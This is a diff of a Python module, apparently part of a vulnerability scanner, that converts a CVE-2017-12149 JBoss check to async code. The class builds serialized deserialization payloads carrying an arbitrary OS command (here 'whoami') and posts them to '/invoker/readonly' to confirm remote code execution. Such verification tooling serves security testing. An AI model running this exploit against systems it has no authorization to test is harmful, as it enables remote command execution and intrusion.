@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 import binascii
-from app.lib.utils.request import request
+from app.lib.request import request
 
 class CVE_2017_12149_BaseVerify:
     def __init__(self, url):
@@ -117,13 +117,13 @@ class CVE_2017_12149_BaseVerify:
             payload = binascii.unhexlify(self.win_payload_1 + self.build_command_hex(command) + self.payload_2 )
         return payload
 
-    def do_post(self, payload):
+    async def do_post(self, payload):
         payload_url = self.url + "/invoker/readonly"
-        result = request.post(payload_url, payload)
-        result_content = result.text
+        result = await request.post(payload_url, payload)
+        result_content = await result.text()
         return result_content
 
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -136,19 +136,16 @@ class CVE_2017_12149_BaseVerify:
         try:
             payload_linux = self.build_payload('linux','whoami')
             payload_win = self.build_payload('windows','whoami')
-            linux_re = self.do_post(payload_linux)
-            win_re = self.do_post(payload_win)
+            linux_re = await self.do_post(payload_linux)
+            win_re = await self.do_post(payload_win)
             if  "[L291919]" in linux_re:
                 self.osname = 'linux'
                 return True
             if "[W291013]" in win_re:
                 self.osname = 'windows'
                 return True
-            return False
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
